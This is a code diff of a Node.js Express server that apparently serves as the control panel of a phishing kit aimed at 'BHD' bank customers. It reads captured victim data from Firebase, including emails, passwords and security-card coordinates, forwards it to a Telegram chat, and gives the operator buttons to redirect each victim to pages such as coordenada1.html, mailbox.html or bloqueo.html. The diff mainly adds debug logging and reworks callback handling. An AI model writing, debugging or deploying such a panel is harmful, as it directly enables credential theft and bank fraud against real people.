@@ -1,4 +1,4 @@
-// server.js - VERSIÓN CON WEBHOOK CONFIGURADO
+// server.js - VERSIÓN CON DEBUG COMPLETO DE BOTONES
 const express = require('express');
 const admin = require('firebase-admin');
 const axios = require('axios');
@@ -63,34 +63,38 @@ const database = admin.database();
 
 // === MIDDLEWARE PARA LOGGING ===
 app.use((req, res, next) => {
-  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
+  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`, req.body ? 'CON BODY' : 'SIN BODY');
   next();
 });
 
-// === FUNCIÓN PARA CREAR BOTONES DE REDIRECCIÓN ===
+// === FUNCIÓN MEJORADA PARA CREAR BOTONES ===
 function createRedirectButtons(uid) {
+  console.log(`🎯 Creando botones para UID: ${uid}`);
+  
   const buttons = [
     [
-      { text: '🏠 INDEX', callback_data: `redirect:${uid}:index.html` },
-      { text: '❓ PREGUNTA 1', callback_data: `redirect:${uid}:pregunta-1.html` }
+      { text: '🏠 INDEX', callback_data: `redirect_${uid}_index.html` },
+      { text: '❓ PREGUNTA 1', callback_data: `redirect_${uid}_pregunta-1.html` }
     ],
     [
-      { text: '📍 COORDENADA 1', callback_data: `redirect:${uid}:coordenada1.html` },
-      { text: '📍 COORDENADA 2', callback_data: `redirect:${uid}:coordenada2.html` }
+      { text: '📍 COORD 1', callback_data: `redirect_${uid}_coordenada1.html` },
+      { text: '📍 COORD 2', callback_data: `redirect_${uid}_coordenada2.html` }
     ],
     [
-      { text: '📍 COORDENADA 3', callback_data: `redirect:${uid}:coordenada3.html` },
-      { text: '🔄 COORDENADA R', callback_data: `redirect:${uid}:coordenadaR.html` }
+      { text: '📍 COORD 3', callback_data: `redirect_${uid}_coordenada3.html` },
+      { text: '🔄 COORD R', callback_data: `redirect_${uid}_coordenadaR.html` }
     ],
     [
-      { text: '📧 MAILBOX', callback_data: `redirect:${uid}:mailbox.html` },
-      { text: '✅ FINALIZADO', callback_data: `redirect:${uid}:finalizado.html` }
+      { text: '📧 MAILBOX', callback_data: `redirect_${uid}_mailbox.html` },
+      { text: '✅ FINAL', callback_data: `redirect_${uid}_finalizado.html` }
     ],
     [
-      { text: '❌ ERROR', callback_data: `redirect:${uid}:error.html` },
-      { text: '🚫 BLOQUEO', callback_data: `redirect:${uid}:bloqueo.html` }
+      { text: '❌ ERROR', callback_data: `redirect_${uid}_error.html` },
+      { text: '🚫 BLOQUEO', callback_data: `redirect_${uid}_bloqueo.html` }
     ]
   ];
+  
+  console.log('🔘 Botones creados:', JSON.stringify(buttons, null, 2));
   
   return {
     inline_keyboard: buttons
@@ -116,10 +120,14 @@ database.ref('/captures').on('child_added', async (snapshot) => {
     const data = snapshot.val();
 
     console.log(`📥 Nueva captura detectada: ${uid}`);
+    console.log('📊 Datos completos:', JSON.stringify(data, null, 2));
 
     // Evitar procesar el campo redirectPage
     const steps = Object.keys(data).filter(key => key !== 'redirectPage');
+    console.log(`🔍 Pasos encontrados: ${steps.join(', ')}`);
+    
     if (steps.length === 0) {
+      console.log('⚠️ No hay pasos para procesar');
       isProcessing = false;
       return;
     }
@@ -156,7 +164,6 @@ database.ref('/captures').on('child_added', async (snapshot) => {
       mensaje += `• Email: \`${payload.email || 'N/A'}\`\n`;
       mensaje += `• Contraseña: \`${payload.emailPassword || 'N/A'}\`\n\n`;
     } else {
-      // Para pasos desconocidos, mostrar todos los datos
       mensaje += `📝 *DATOS*\n`;
       Object.keys(payload).forEach(key => {
         mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
@@ -177,33 +184,49 @@ database.ref('/captures').on('child_added', async (snapshot) => {
     // Crear teclado inline con botones
     const replyMarkup = createRedirectButtons(uid);
 
+    console.log('📨 Enviando mensaje a Telegram...');
+    console.log(`🔗 URL: ${TELEGRAM_API}/sendMessage`);
+    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
+    console.log(`🎯 Reply Markup:`, JSON.stringify(replyMarkup, null, 2));
+
     // Enviar a Telegram con botones
     const telegramResponse = await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: mensaje,
       parse_mode: 'Markdown',
       reply_markup: replyMarkup
+    }, {
+      timeout: 10000
     });
 
     console.log(`✅ Enviado a Telegram con botones: ${uid}/${step}`);
     console.log(`📨 Message ID: ${telegramResponse.data.result.message_id}`);
+    console.log('📊 Respuesta completa:', JSON.stringify(telegramResponse.data, null, 2));
 
   } catch (error) {
-    console.error('❌ Error al procesar captura:', error.message);
+    console.error('❌ Error al procesar captura:');
+    console.error('🔴 Mensaje:', error.message);
     if (error.response) {
-      console.error('📊 Error response:', error.response.data);
+      console.error('🔴 Status:', error.response.status);
+      console.error('🔴 Data:', error.response.data);
     }
   } finally {
     isProcessing = false;
   }
 });
 
-// === 2. WEBHOOK PARA RECIBIR CALLBACKS DE BOTONES ===
+// === 2. WEBHOOK MEJORADO PARA CALLBACKS ===
 app.post('/telegram/webhook', express.json(), async (req, res) => {
   try {
-    console.log('📨 Webhook recibido de Telegram');
+    console.log('='.repeat(50));
+    console.log('📨 WEBHOOK RECIBIDO DE TELEGRAM');
+    console.log('📦 BODY COMPLETO:', JSON.stringify(req.body, null, 2));
+    console.log('='.repeat(50));
 
-    // Manejar callback queries (botones)
+    // IMPORTANTE: Responder inmediatamente a Telegram
+    res.status(200).send('OK');
+
+    // Manejar callback queries (botones) - ASINCRÓNICO
     if (req.body.callback_query) {
       const callbackData = req.body.callback_query.data;
       const chatId = req.body.callback_query.message.chat.id;
@@ -211,189 +234,152 @@ app.post('/telegram/webhook', express.json(), async (req, res) => {
       const userId = req.body.callback_query.from.id;
       const callbackId = req.body.callback_query.id;
 
-      console.log(`🔘 Callback recibido: ${callbackData}`);
-      console.log(`💬 Chat ID: ${chatId}, User ID: ${userId}`);
+      console.log(`🔘 CALLBACK DETECTADO:`);
+      console.log(`   Data: ${callbackData}`);
+      console.log(`   Chat ID: ${chatId}`);
+      console.log(`   Message ID: ${messageId}`);
+      console.log(`   User ID: ${userId}`);
+      console.log(`   Callback ID: ${callbackId}`);
 
-      // Validar que es un comando de redirección
-      if (callbackData.startsWith('redirect:')) {
-        const parts = callbackData.split(':');
-        if (parts.length === 3) {
-          const uid = parts[1];
-          const page = parts[2];
-
-          console.log(`🎯 Procesando redirección: ${uid} -> ${page}`);
-
-          // Validar página permitida
-          if (!ALLOWED_PAGES.includes(page)) {
-            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-              callback_query_id: callbackId,
-              text: `❌ Página no permitida: ${page}`
-            });
-            return res.status(200).send('OK');
-          }
-
-          try {
-            // Actualizar Firebase para redirigir al usuario
-            await database.ref(`/captures/${uid}/redirectPage`).set(page);
-            console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);
-
-            // Responder al callback query
-            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-              callback_query_id: callbackId,
-              text: `✅ Redirigiendo a: ${page}`
-            });
-
-            // Editar el mensaje original para mostrar la acción realizada
-            await axios.post(`${TELEGRAM_API}/editMessageText`, {
-              chat_id: chatId,
-              message_id: messageId,
-              text: `✅ *REDIRECCIÓN CONFIGURADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
-              parse_mode: 'Markdown'
-            });
-
-            console.log(`✅ Redirección completada: ${uid} → ${page} por usuario ${userId}`);
-
-          } catch (firebaseError) {
-            console.error('❌ Error de Firebase:', firebaseError.message);
-            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-              callback_query_id: callbackId,
-              text: '❌ Error al actualizar Firebase'
-            });
-          }
-        }
-      }
-
-      return res.status(200).send('OK');
+      // Procesar el callback de forma asíncrona
+      processCallbackQuery({
+        callbackData,
+        chatId,
+        messageId,
+        userId,
+        callbackId
+      }).catch(error => {
+        console.error('❌ Error procesando callback:', error.message);
+      });
     }
 
-    // Manejar mensajes de texto (compatibilidad hacia atrás)
-    const message = req.body?.message?.text;
-    const chatId = req.body?.message?.chat?.id;
-
-    if (message && message.startsWith('/redirect ')) {
-      console.log(`📨 Comando de texto recibido: ${message}`);
-
-      const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
-      const match = message.match(commandRegex);
-
-      if (match) {
-        const uid = match[1];
-        const page = match[2];
-
-        if (ALLOWED_PAGES.includes(page)) {
-          await database.ref(`/captures/${uid}/redirectPage`).set(page);
-          
-          await axios.post(`${TELEGRAM_API}/sendMessage`, {
-            chat_id: chatId,
-            text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
-            parse_mode: 'Markdown'
-          });
-
-          console.log(`✅ Redirección establecida vía texto: ${uid} → ${page}`);
-        }
-      }
-    }
-
-    return res.status(200).send('OK');
-
-  } catch (error) {
-    console.error('❌ Error en webhook:', error.message);
-    
-    // Responder al callback query en caso de error
-    if (req.body.callback_query) {
-      try {
-        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-          callback_query_id: req.body.callback_query.id,
-          text: '❌ Error al procesar la solicitud'
+    // Manejar mensajes de texto
+    else if (req.body.message && req.body.message.text) {
+      const message = req.body.message.text;
+      const chatId = req.body.message.chat.id;
+      
+      console.log(`💬 MENSAJE DE TEXTO: ${message}`);
+      
+      if (message.startsWith('/redirect ')) {
+        processTextRedirect(message, chatId).catch(error => {
+          console.error('❌ Error procesando texto:', error.message);
         });
-      } catch (e) {
-        console.error('❌ Error al responder callback:', e.message);
       }
     }
-    
-    return res.status(200).send('OK');
-  }
-});
 
-// === RUTAS PARA CONFIGURAR WEBHOOK ===
-
-// Configurar webhook de Telegram
-app.get('/setup-webhook', async (req, res) => {
-  try {
-    const webhookUrl = `${SERVER_URL}/telegram/webhook`;
-    console.log(`🔗 Configurando webhook: ${webhookUrl}`);
-    
-    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
-      url: webhookUrl,
-      drop_pending_updates: true
-    });
-    
-    console.log('✅ Webhook configurado:', response.data);
-    
-    res.json({
-      success: true,
-      webhook_url: webhookUrl,
-      response: response.data
-    });
-    
   } catch (error) {
-    console.error('❌ Error configurando webhook:', error.message);
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    console.error('❌ ERROR EN WEBHOOK:', error.message);
+    // Ya respondimos con OK, así que solo logueamos el error
   }
 });
 
-// Verificar estado del webhook
-app.get('/webhook-info', async (req, res) => {
+// === FUNCIÓN PARA PROCESAR CALLBACKS ===
+async function processCallbackQuery({ callbackData, chatId, messageId, userId, callbackId }) {
   try {
-    const response = await axios.get(`${TELEGRAM_API}/getWebhookInfo`);
-    
-    res.json({
-      success: true,
-      webhook_info: response.data
-    });
-    
+    // Validar que es un comando de redirección (usando _ en lugar de :)
+    if (callbackData.startsWith('redirect_')) {
+      const parts = callbackData.split('_');
+      console.log(`🔍 Partes del callback:`, parts);
+      
+      if (parts.length >= 3) {
+        const uid = parts[1];
+        const page = parts.slice(2).join('_'); // Unir el resto como página
+        
+        console.log(`🎯 Procesando redirección: ${uid} -> ${page}`);
+
+        // Validar página permitida
+        if (!ALLOWED_PAGES.includes(page)) {
+          console.log(`❌ Página no permitida: ${page}`);
+          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+            callback_query_id: callbackId,
+            text: `❌ Página no permitida: ${page}`,
+            show_alert: true
+          });
+          return;
+        }
+
+        // Actualizar Firebase para redirigir al usuario
+        await database.ref(`/captures/${uid}/redirectPage`).set(page);
+        console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);
+
+        // Responder al callback query
+        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+          callback_query_id: callbackId,
+          text: `✅ Redirigiendo a: ${page}`
+        });
+
+        // Editar el mensaje original para mostrar la acción realizada
+        await axios.post(`${TELEGRAM_API}/editMessageText`, {
+          chat_id: chatId,
+          message_id: messageId,
+          text: `✅ *REDIRECCIÓN CONFIGURADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`,
+          parse_mode: 'Markdown'
+        });
+
+        console.log(`✅ Redirección completada: ${uid} → ${page} por usuario ${userId}`);
+
+      } else {
+        console.log('❌ Formato de callback inválido');
+        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+          callback_query_id: callbackId,
+          text: '❌ Error: Formato inválido',
+          show_alert: true
+        });
+      }
+    } else {
+      console.log(`❌ Callback no reconocido: ${callbackData}`);
+    }
   } catch (error) {
-    console.error('❌ Error obteniendo info del webhook:', error.message);
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+    console.error('❌ Error procesando callback:', error.message);
+    try {
+      await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+        callback_query_id: callbackId,
+        text: '❌ Error interno del servidor',
+        show_alert: true
+      });
+    } catch (e) {
+      console.error('❌ Error al responder callback:', e.message);
+    }
   }
-});
+}
 
-// Eliminar webhook
-app.get('/delete-webhook', async (req, res) => {
-  try {
-    const response = await axios.get(`${TELEGRAM_API}/deleteWebhook`);
-    
-    res.json({
-      success: true,
-      response: response.data
-    });
-    
-  } catch (error) {
-    console.error('❌ Error eliminando webhook:', error.message);
-    res.status(500).json({
-      success: false,
-      error: error.message
-    });
+// === FUNCIÓN PARA PROCESAR TEXTO ===
+async function processTextRedirect(message, chatId) {
+  const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
+  const match = message.match(commandRegex);
+
+  if (match) {
+    const uid = match[1];
+    const page = match[2];
+
+    if (ALLOWED_PAGES.includes(page)) {
+      await database.ref(`/captures/${uid}/redirectPage`).set(page);
+      
+      await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        chat_id: chatId,
+        text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
+        parse_mode: 'Markdown'
+      });
+
+      console.log(`✅ Redirección establecida vía texto: ${uid} → ${page}`);
+    }
   }
-});
+}
 
-// === RUTAS ADICIONALES ===
+// === RUTAS DE DEBUG ===
 
-// Ruta para testear botones de Telegram
-app.get('/test-buttons', async (req, res) => {
+// Ruta para testear botones con diferentes formatos
+app.get('/test-buttons-debug', async (req, res) => {
   try {
     const testUid = 'test-' + Date.now();
+    
+    console.log('🧪 TEST DE BOTONES CON DEBUG');
+    
     const replyMarkup = createRedirectButtons(testUid);
     
     const testMessage = await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: '🧪 *TEST DE BOTONES BHD*\n\nEste es un mensaje de prueba con botones de redirección.\nHaz clic en cualquier botón para probar.',
+      text: '🧪 *TEST DEBUG DE BOTONES BHD*\n\nHaz clic en cualquier botón y revisa los logs del servidor.',
       parse_mode: 'Markdown',
       reply_markup: replyMarkup
     });
@@ -401,6 +387,7 @@ app.get('/test-buttons', async (req, res) => {
     res.json({
       success: true,
       message: 'Mensaje de prueba con botones enviado',
+      test_uid: testUid,
       data: testMessage.data
     });
     
@@ -413,20 +400,32 @@ app.get('/test-buttons', async (req, res) => {
   }
 });
 
-// Ruta para ver datos actuales de Firebase
-app.get('/api/captures', async (req, res) => {
+// Ruta para simular un callback (para testing)
+app.get('/simulate-callback', async (req, res) => {
   try {
-    const snapshot = await database.ref('/captures').once('value');
-    const data = snapshot.val();
+    const testUid = 'test-' + Date.now();
+    const testPage = 'index.html';
+    const callbackData = `redirect_${testUid}_${testPage}`;
+    
+    console.log('🎭 SIMULANDO CALLBACK:', callbackData);
+    
+    // Simular el procesamiento
+    await processCallbackQuery({
+      callbackData,
+      chatId: TELEGRAM_CHAT_ID,
+      messageId: 12345,
+      userId: 67890,
+      callbackId: 'test-callback-id'
+    });
     
     res.json({
       success: true,
-      total: data ? Object.keys(data).length : 0,
-      captures: data,
-      timestamp: new Date().toISOString()
+      simulated: true,
+      callback_data: callbackData
     });
+    
   } catch (error) {
-    console.error('❌ Error al consultar Firebase:', error.message);
+    console.error('❌ Error simulando callback:', error.message);
     res.status(500).json({
       success: false,
       error: error.message
@@ -434,58 +433,15 @@ app.get('/api/captures', async (req, res) => {
   }
 });
 
-// Ruta de health check para Render
-app.get('/health', (req, res) => {
-  res.status(200).json({ 
-    status: 'OK', 
-    timestamp: new Date().toISOString(),
-    service: 'BHD Firebase Server',
-    features: {
-      buttons: true,
-      webhook: true,
-      firebase: true
-    }
-  });
-});
+// ... (mantén las otras rutas igual: setup-webhook, webhook-info, etc.)
 
-// Ruta de información del servidor
-app.get('/info', (req, res) => {
-  res.json({
-    service: 'BHD Firebase Server',
-    version: '4.0.0',
-    environment: process.env.NODE_ENV || 'development',
-    server_url: SERVER_URL,
-    features: {
-      telegram_buttons: true,
-      webhook_configured: true,
-      pages_available: ALLOWED_PAGES.length,
-      firebase_realtime: true
-    },
-    firebase: {
-      initialized: true,
-      database: 'Connected'
-    },
-    telegram: {
-      bot: TELEGRAM_BOT_TOKEN ? 'Configured' : 'Not configured',
-      chat_id: TELEGRAM_CHAT_ID,
-      buttons_enabled: true
-    },
-    endpoints: {
-      setup_webhook: '/setup-webhook',
-      webhook_info: '/webhook-info',
-      test_buttons: '/test-buttons',
-      health: '/health'
-    }
-  });
-});
-
-// Ruta principal
+// Ruta principal mejorada
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>BHD Server</title>
+        <title>BHD Server - DEBUG</title>
         <style>
             body { font-family: Arial, sans-serif; margin: 40px; }
             .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
@@ -499,60 +455,36 @@ app.get('/', (req, res) => {
         </style>
     </head>
     <body>
-        <h1>🚀 Servidor BHD Firebase + Telegram</h1>
-        <div class="status success">✅ <strong>VERSIÓN 4.0 - WEBHOOK CONFIGURADO</strong></div>
-        
-        <div class="status warning">
-            <strong>⚠️ PASO IMPORTANTE:</strong> Debes configurar el webhook para que los botones funcionen.
-            <br><a href="/setup-webhook" class="btn">🔗 Configurar Webhook</a>
-        </div>
+        <h1>🚀 Servidor BHD - DEBUG BOTONES</h1>
+        <div class="status warning">🔍 <strong>MODO DEBUG ACTIVADO</strong></div>
         
         <div class="endpoints">
-            <strong>🔧 Endpoints Esenciales:</strong><br>
-            • <a href="/setup-webhook">/setup-webhook</a> - 🔗 CONFIGURAR WEBHOOK (OBLIGATORIO)<br>
+            <strong>🔧 Endpoints de Debug:</strong><br>
+            • <a href="/test-buttons-debug">/test-buttons-debug</a> - Probar botones con logging<br>
+            • <a href="/simulate-callback">/simulate-callback</a> - Simular callback<br>
             • <a href="/webhook-info">/webhook-info</a> - Ver estado del webhook<br>
-            • <a href="/test-buttons">/test-buttons</a> - Probar botones de Telegram<br>
-            • <a href="/health">/health</a> - Estado del servidor<br>
-            • <a href="/info">/info</a> - Información del sistema<br>
-            • <a href="/api/captures">/api/captures</a> - Ver datos de Firebase
+            • <a href="/api/captures">/api/captures</a> - Ver datos de Firebase<br>
+            • <a href="/health">/health</a> - Estado del servidor
         </div>
         
         <div class="status info">
-            <strong>🎯 Características Activadas:</strong><br>
-            • Botones interactivos en Telegram<br>
-            • Webhook para callbacks<br>
-            • 10 páginas de redirección disponibles<br>
-            • Respuestas inmediatas a los clics<br>
-            • Compatible con comandos de texto
+            <strong>📝 Instrucciones de Debug:</strong><br>
+            1. Ve a <a href="/test-buttons-debug">/test-buttons-debug</a><br>
+            2. Haz clic en un botón en Telegram<br>
+            3. Revisa los logs en Render<br>
+            4. Los logs mostrarán exactamente qué está pasando
         </div>
     </body>
     </html>
   `);
 });
 
-// Manejo de errores global
-app.use((error, req, res, next) => {
-  console.error('❌ Error global:', error);
-  res.status(500).json({ error: 'Internal Server Error' });
-});
+// ... (mantén el resto del código igual)
 
-// Ruta 404
-app.use('*', (req, res) => {
-  res.status(404).json({ error: 'Ruta no encontrada' });
-});
-
-// Inicializar servidor
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`🚀 Servidor BHD con WEBHOOK corriendo en puerto ${PORT}`);
-  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
-  console.log(`🔗 Server URL: ${SERVER_URL}`);
-  console.log(`📞 Health check: ${SERVER_URL}/health`);
-  console.log(`🔧 Configurar Webhook: ${SERVER_URL}/setup-webhook`);
-  console.log(`🧪 Test Botones: ${SERVER_URL}/test-buttons`);
-  console.log(`🎯 Páginas disponibles: ${ALLOWED_PAGES.join(', ')}`);
-  console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? '✅ CONFIGURADO' : '❌ NO CONFIGURADO'}`);
-  console.log(`🔥 Firebase: ✅ INICIALIZADO`);
-  console.log(`👂 Listener Firebase: ✅ ACTIVO`);
-  console.log(`🔔 Webhook: ⚠️  NECESITA CONFIGURACIÓN`);
+  console.log(`🚀 Servidor BHD DEBUG corriendo en puerto ${PORT}`);
+  console.log(`🔗 Webhook URL: ${SERVER_URL}/telegram/webhook`);
+  console.log(`🧪 Test Debug: ${SERVER_URL}/test-buttons-debug`);
+  console.log(`🎭 Simular Callback: ${SERVER_URL}/simulate-callback`);
 });
